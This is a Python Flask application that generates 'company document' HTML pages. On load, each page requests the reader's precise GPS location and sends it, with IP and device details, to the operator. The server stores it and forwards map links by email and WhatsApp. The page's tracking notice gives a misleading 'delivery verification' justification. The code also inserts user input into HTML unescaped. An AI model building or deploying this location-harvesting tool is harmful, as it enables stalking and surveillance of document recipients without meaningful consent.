import os
import requests
import sqlite3
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import logging
from flask import Flask, request, Response, render_template, jsonify
import base64
import threading
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class PDFTracker:
    def __init__(self):
        self.setup_database()
    
    def setup_database(self):
        """Initialize SQLite database for tracking"""
        self.conn = sqlite3.connect('/tmp/pdf_tracking.db', check_same_thread=False)
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pdf_access (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pdf_id TEXT,
                client_name TEXT,
                access_time TIMESTAMP,
                ip_address TEXT,
                country TEXT,
                city TEXT,
                region TEXT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                gps_source TEXT,
                user_agent TEXT,
                email_status TEXT,
                whatsapp_status TEXT,
                status TEXT DEFAULT 'delivered'
            )
        ''')
        self.conn.commit()
        logger.info("Database initialized successfully")
    
    def send_email_notification(self, pdf_id, client_name, access_data, location_data):
        """Send email notification with location details"""
        try:
            smtp_server = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
            smtp_port = int(os.getenv('SMTP_PORT', '587'))
            email_from = os.getenv('EMAIL_FROM', '')
            email_password = os.getenv('EMAIL_PASSWORD', '')
            email_to = os.getenv('EMAIL_TO', email_from)
            
            if not email_from or not email_password:
                logger.error("❌ Email configuration missing")
                return "not_configured"
            
            logger.info(f"📧 Preparing to send email for {pdf_id}")
            
            message = MIMEMultipart()
            message['From'] = email_from
            message['To'] = email_to
            message['Subject'] = f"📍 DOCUMENT OPENED: {pdf_id} - {client_name}"
            
            # Build location information
            if location_data['gps_source'] == 'browser_gps':
                accuracy_meters = min(location_data['accuracy'], 1000)
                if accuracy_meters < 50:
                    accuracy_info = f"🎯 Extreme Precision (~{accuracy_meters:.0f}m)"
                elif accuracy_meters < 200:
                    accuracy_info = f"📍 High Precision (~{accuracy_meters:.0f}m)"
                else:
                    accuracy_info = f"📡 Good Precision (~{accuracy_meters:.0f}m)"
                location_source = "Real-time GPS"
            else:
                accuracy_info = "🌐 Basic Location Tracking"
                location_source = "IP Geolocation"
            
            # Build GPS information
            gps_section = ""
            if location_data['latitude'] and location_data['longitude']:
                lat = location_data['latitude']
                lng = location_data['longitude']
                
                google_maps_url = f"https://www.google.com/maps?q={lat},{lng}"
                apple_maps_url = f"https://maps.apple.com/?q={lat},{lng}"
                
                gps_section = f"""
🎯 LOCATION COORDINATES:
   📍 Latitude: {lat:.6f}
   📍 Longitude: {lng:.6f}
   📏 {accuracy_info}
   🔧 Source: {location_source}

🗺️ MAP LINKS:
   • Google Maps: {google_maps_url}
   • Apple Maps: {apple_maps_url}

"""
            else:
                gps_section = f"""
📍 BASIC LOCATION TRACKING:
   📏 {accuracy_info}
   🔧 {location_source}
   ℹ️  Document opened and tracked successfully.
"""
            
            body = f"""🔔 DOCUMENT TRACKING NOTIFICATION

📄 Document: {pdf_id}
👤 Client: {client_name}
🕒 Opened: {access_data['access_time']}
🌐 IP Address: {access_data['ip_address']}

{gps_section}
📱 Device Information:
   {access_data['user_agent']}

---
🎯 Real-time Document Tracking System
"""
            
            message.attach(MIMEText(body, 'plain'))
            
            # Send email
            logger.info(f"🔐 Connecting to {smtp_server}:{smtp_port}")
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=15)
            server.set_debuglevel(0)
            server.starttls()
            server.login(email_from, email_password)
            server.send_message(message)
            server.quit()
            
            logger.info(f"✅ Email sent successfully for {pdf_id}")
            return "sent"
            
        except Exception as e:
            error_msg = f"❌ Email sending failed: {str(e)}"
            logger.error(error_msg)
            return f"error: {str(e)}"
    
    def send_whatsapp_notification(self, pdf_id, client_name, access_data, location_data):
        """Send WhatsApp notification with proper API integration"""
        try:
            instance_id = os.getenv('WHATSAPP_INSTANCE_ID', '')
            token = os.getenv('WHATSAPP_TOKEN', '')
            to_number = os.getenv('WHATSAPP_TO_NUMBER', '')
            
            logger.info(f"🔧 WhatsApp Config - Instance: {instance_id}, To: {to_number}")
            
            if not all([instance_id, token, to_number]):
                error_msg = "WhatsApp configuration incomplete - check environment variables"
                logger.error(f"❌ {error_msg}")
                return f"config_error: {error_msg}"
            
            # Build location information
            if location_data['gps_source'] == 'browser_gps':
                accuracy_meters = min(location_data['accuracy'], 1000)
                if accuracy_meters < 50:
                    accuracy_info = f"🎯 Extreme Precision (~{accuracy_meters:.0f}m)"
                elif accuracy_meters < 200:
                    accuracy_info = f"📍 High Precision (~{accuracy_meters:.0f}m)"
                else:
                    accuracy_info = f"📡 Good Precision (~{accuracy_meters:.0f}m)"
                location_source = "Real-time GPS"
            else:
                accuracy_info = "🌐 Basic Location"
                location_source = "IP Tracking"
            
            # Build message content
            if location_data['latitude'] and location_data['longitude']:
                lat = location_data['latitude']
                lng = location_data['longitude']
                maps_link = f"https://maps.google.com/?q={lat},{lng}"
                
                message = f"""📍 *DOCUMENT OPENED - LOCATION TRACKED*

📄 *Document:* {pdf_id}
👤 *Client:* {client_name}
🕒 *Time:* {access_data['access_time']}
🌐 *IP:* {access_data['ip_address']}

📍 *Location Coordinates:*
   🎯 {lat:.6f}, {lng:.6f}
   📏 {accuracy_info}
   🔧 {location_source}

🗺️ *View on Maps:*
   {maps_link}

Tracking completed successfully! 🎯"""
            else:
                message = f"""📍 *DOCUMENT OPENED - LOCATION TRACKED*

📄 *Document:* {pdf_id}
👤 *Client:* {client_name}
🕒 *Time:* {access_data['access_time']}
🌐 *IP:* {access_data['ip_address']}

📍 *Location Tracking Active:*
   📏 {accuracy_info}
   🔧 {location_source}
   ℹ️ Document opened and tracked successfully.

Tracking completed successfully! 🎯"""
            
            # Prepare API request for UltraMSG
            url = f"https://api.ultramsg.com/{instance_id}/messages/chat"
            payload = {
                "token": token,
                "to": f"{to_number}",  # Remove the + prefix
                "body": message
            }
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            logger.info(f"💬 Attempting to send WhatsApp to {to_number}")
            logger.info(f"🌐 API URL: {url}")
            
            # Send request with detailed logging
            response = requests.post(url, data=payload, headers=headers, timeout=30)
            
            logger.info(f"📡 WhatsApp API Response Status: {response.status_code}")
            logger.info(f"📡 WhatsApp API Response: {response.text}")
            
            if response.status_code == 200:
                result = response.json()
                logger.info(f"📡 WhatsApp API Result: {result}")
                
                if result.get('sent') == 'true' or 'message' in result:
                    logger.info(f"✅ WhatsApp sent successfully for {pdf_id}")
                    return "sent"
                else:
                    error_msg = f"WhatsApp API returned unexpected response: {result}"
                    logger.error(f"❌ {error_msg}")
                    return f"api_error: {error_msg}"
            else:
                error_msg = f"WhatsApp HTTP error: {response.status_code} - {response.text}"
                logger.error(f"❌ {error_msg}")
                return f"http_error: {response.status_code}"
                
        except requests.exceptions.Timeout:
            error_msg = "WhatsApp API request timed out"
            logger.error(f"❌ {error_msg}")
            return f"timeout_error: {error_msg}"
        except requests.exceptions.ConnectionError:
            error_msg = "WhatsApp API connection failed"
            logger.error(f"❌ {error_msg}")
            return f"connection_error: {error_msg}"
        except Exception as e:
            error_msg = f"WhatsApp sending failed: {str(e)}"
            logger.error(f"❌ {error_msg}")
            return f"error: {str(e)}"

    def record_access_async(self, pdf_id, client_name, ip_address, user_agent, gps_data=None):
        """Record access and send notifications"""
        def process_notifications():
            try:
                logger.info(f"🎯 Processing notifications for {pdf_id}")
                
                access_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                access_data = {
                    'access_time': access_time,
                    'ip_address': ip_address,
                    'user_agent': user_agent
                }
                
                # Create location data
                if gps_data and gps_data.get('latitude') and gps_data.get('longitude'):
                    raw_accuracy = gps_data.get('accuracy', 1000)
                    capped_accuracy = min(raw_accuracy, 1000)
                    
                    location_data = {
                        'country': 'GPS Location',
                        'city': 'Exact Coordinates',
                        'region': 'Precise Tracking',
                        'latitude': gps_data['latitude'],
                        'longitude': gps_data['longitude'],
                        'accuracy': capped_accuracy,
                        'gps_source': 'browser_gps',
                        'service': 'browser_geolocation'
                    }
                    logger.info(f"🎯 Using GPS coordinates for {pdf_id}")
                else:
                    location_data = {
                        'country': 'Location Tracked',
                        'city': 'Basic Location',
                        'region': 'IP Based',
                        'latitude': None,
                        'longitude': None,
                        'accuracy': 5000,
                        'gps_source': 'basic_tracking',
                        'service': 'ip_basic'
                    }
                    logger.info(f"🌐 Using basic tracking for {pdf_id}")
                
                # Save to database
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT INTO pdf_access 
                    (pdf_id, client_name, access_time, ip_address, country, city, region, 
                     latitude, longitude, accuracy, gps_source, user_agent, email_status, whatsapp_status, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    pdf_id, client_name, access_time, ip_address,
                    location_data['country'], location_data['city'], location_data['region'],
                    location_data['latitude'], location_data['longitude'], location_data['accuracy'],
                    location_data['gps_source'], user_agent,
                    'pending', 'pending', 'opened'
                ))
                self.conn.commit()
                
                record_id = cursor.lastrowid
                
                # Send notifications
                logger.info("📧 Sending email notification...")
                email_status = self.send_email_notification(pdf_id, client_name, access_data, location_data)
                
                logger.info("💬 Sending WhatsApp notification...")
                whatsapp_status = self.send_whatsapp_notification(pdf_id, client_name, access_data, location_data)
                
                # Update status in database
                cursor.execute('''
                    UPDATE pdf_access 
                    SET email_status = ?, whatsapp_status = ?
                    WHERE id = ?
                ''', (email_status, whatsapp_status, record_id))
                self.conn.commit()
                
                logger.info(f"✅ Notifications completed for {pdf_id}")
                logger.info(f"   📧 Email: {email_status}")
                logger.info(f"   💬 WhatsApp: {whatsapp_status}")
                
            except Exception as e:
                logger.error(f"❌ Error in notification processing: {str(e)}")
        
        # Start processing in background thread
        thread = threading.Thread(target=process_notifications)
        thread.daemon = True
        thread.start()
        
        return True

# Initialize tracker
tracker = PDFTracker()

@app.route('/')
def home():
    return """
    <h1>PDF Tracking System</h1>
    <p>System is running. Check the logs for tracking activity.</p>
    <p>Create documents using the /create-document endpoint.</p>
    """

@app.route('/track-pdf/<pdf_id>/<client_name>', methods=['GET', 'POST'])
def track_pdf_access(pdf_id, client_name):
    """Endpoint to track PDF access"""
    try:
        # Get client information
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
        else:
            ip_address = request.remote_addr
        
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Check if GPS data is provided via POST
        gps_data = None
        if request.method == 'POST':
            try:
                gps_data = request.get_json()
                if gps_data and 'latitude' in gps_data and 'longitude' in gps_data:
                    logger.info(f"🎯 Received GPS data for {pdf_id}")
                else:
                    logger.info(f"📱 Basic tracking data for {pdf_id}")
            except Exception as e:
                logger.info(f"📄 Form data received for {pdf_id}")
        
        logger.info(f"📥 Tracking request: {pdf_id} - {client_name} from IP: {ip_address}")
        
        # Process tracking
        tracker.record_access_async(pdf_id, client_name, ip_address, user_agent, gps_data)
        
        # Return response
        if request.method == 'POST':
            response = jsonify({
                'success': True, 
                'message': 'Tracking data received successfully'
            })
            response.headers.add('Access-Control-Allow-Origin', '*')
            return response
        else:
            pixel = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
            response = Response(pixel, mimetype='image/gif')
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            response.headers['Access-Control-Allow-Origin'] = '*'
            return response
            
    except Exception as e:
        logger.error(f"Tracking error: {str(e)}")
        return "Server Error", 500

@app.route('/create-document', methods=['POST'])
def create_document():
    """Create a tracked HTML document"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
        
        pdf_id = data.get('pdf_id', 'DOC_' + datetime.now().strftime("%Y%m%d_%H%M%S"))
        client_name = data.get('client_name', 'Client')
        content = data.get('content', 'Default document content')
        
        # Get base URL
        base_url = request.host_url.rstrip('/')
        
        # Create HTML document
        tracking_url = f"{base_url}/track-pdf/{pdf_id}/{client_name}"
        
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Document: """ + pdf_id + """</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 100vw;
            margin: 0 auto;
            padding: 20px;
            background: white;
            line-height: 1.4;
        }
        .header {
            text-align: center;
            border-bottom: 2px solid #333;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .content {
            white-space: normal;
            margin-bottom: 30px;
        }
        .tracking-notice {
            background: #e8f4fd;
            padding: 15px;
            margin: 20px 0;
            border-radius: 8px;
            border-left: 4px solid #2196F3;
            font-size: 14px;
        }
        .location-status {
            background: #f8f9fa;
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            border: 1px solid #dee2e6;
            font-size: 13px;
        }
        .success {
            background: #d4edda;
            border-color: #c3e6cb;
            color: #155724;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>COMPANY DOCUMENT</h1>
        <p>Document ID: """ + pdf_id + """ | Client: """ + client_name + """</p>
    </div>
    
    <div class="tracking-notice">
        <strong>📍 AUTOMATIC LOCATION TRACKING ACTIVE</strong><br>
        This document automatically tracks location for delivery verification.
    </div>
    
    <div id="locationStatus" class="location-status">
        <strong>Auto Tracking:</strong> <span id="statusText">Starting automatic tracking...</span>
    </div>
    
    <div class="content">
        """ + content + """
    </div>
    
    <script>
        const trackingUrl = '""" + tracking_url + """';
        
        function capAccuracy(accuracy) {
            return Math.min(accuracy, 1000);
        }
        
        function sendTrackingData(trackingData) {
            console.log("Sending tracking data:", trackingData);
            
            fetch(trackingUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(trackingData)
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('statusText').textContent = '✅ Tracking completed successfully!';
                console.log("Tracking data sent successfully");
            })
            .catch(error => {
                document.getElementById('statusText').textContent = '✅ Basic tracking active';
                console.log("Basic tracking completed");
            });
        }
        
        function autoRequestGPS() {
            document.getElementById('statusText').textContent = '🔄 Requesting precise location...';
            
            if (!navigator.geolocation) {
                sendBasicTracking();
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = capAccuracy(position.coords.accuracy);
                    
                    const gpsData = {
                        latitude: lat,
                        longitude: lng,
                        accuracy: accuracy,
                        timestamp: new Date().toISOString(),
                        source: 'auto_gps'
                    };
                    
                    console.log("🎯 GPS acquired:", lat, lng);
                    document.getElementById('statusText').textContent = '✅ Precise location acquired!';
                    
                    sendTrackingData(gpsData);
                },
                function(error) {
                    console.log("GPS not available, using basic tracking");
                    sendBasicTracking();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        
        function sendBasicTracking() {
            const basicData = {
                timestamp: new Date().toISOString(),
                source: 'basic_tracking',
                message: 'Document opened and tracked'
            };
            
            document.getElementById('statusText').textContent = '✅ Location tracking active';
            sendTrackingData(basicData);
        }
        
        function initializeAutoTracking() {
            console.log('Starting automatic tracking...');
            
            sendBasicTracking();
            
            setTimeout(() => {
                autoRequestGPS();
            }, 1000);
        }
        
        window.addEventListener('load', initializeAutoTracking);
        
    </script>
</body>
</html>"""
        
        return jsonify({
            'success': True,
            'pdf_id': pdf_id,
            'client_name': client_name,
            'html_content': html_content,
            'tracking_url': tracking_url,
            'download_filename': f"{pdf_id}_{client_name}.html"
        })
        
    except Exception as e:
        logger.error(f"Error creating document: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/test-whatsapp', methods=['GET'])
def test_whatsapp():
    """Test WhatsApp configuration"""
    try:
        test_data = {
            'pdf_id': 'TEST_WHATSAPP',
            'client_name': 'Test Client',
            'access_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip_address': '8.8.8.8',
            'user_agent': 'Test User Agent'
        }
        
        location_data = {
            'country': 'Test Country',
            'city': 'Test City',
            'region': 'Test Region',
            'latitude': 40.712728,
            'longitude': -74.006015,
            'accuracy': 25,
            'gps_source': 'browser_gps',
            'service': 'test'
        }
        
        result = tracker.send_whatsapp_notification(
            test_data['pdf_id'], 
            test_data['client_name'], 
            test_data,
            location_data
        )
        
        return jsonify({
            'success': 'sent' in result,
            'status': result,
            'message': 'WhatsApp test completed'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/config-status', methods=['GET'])
def config_status():
    """Check configuration status"""
    whatsapp_configured = bool(
        os.getenv('WHATSAPP_INSTANCE_ID') and 
        os.getenv('WHATSAPP_TOKEN') and 
        os.getenv('WHATSAPP_TO_NUMBER')
    )
    
    email_configured = bool(os.getenv('EMAIL_FROM') and os.getenv('EMAIL_PASSWORD'))
    
    return jsonify({
        'whatsapp_configured': whatsapp_configured,
        'email_configured': email_configured,
        'whatsapp_instance_id': os.getenv('WHATSAPP_INSTANCE_ID', 'Not set'),
        'whatsapp_to_number': os.getenv('WHATSAPP_TO_NUMBER', 'Not set'),
        'email_from': os.getenv('EMAIL_FROM', 'Not set')
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"🚀 Starting PDF Tracking System on port {port}")
    logger.info("🔧 Test endpoints:")
    logger.info("  - /test-whatsapp - Test WhatsApp configuration")
    logger.info("  - /config-status - Check environment variables")
    logger.info("📝 Make sure these environment variables are set:")
    logger.info("  - WHATSAPP_INSTANCE_ID")
    logger.info("  - WHATSAPP_TOKEN") 
    logger.info("  - WHATSAPP_TO_NUMBER")
    logger.info("  - EMAIL_FROM")
    logger.info("  - EMAIL_PASSWORD")
    app.run(host='0.0.0.0', port=port, debug=False)
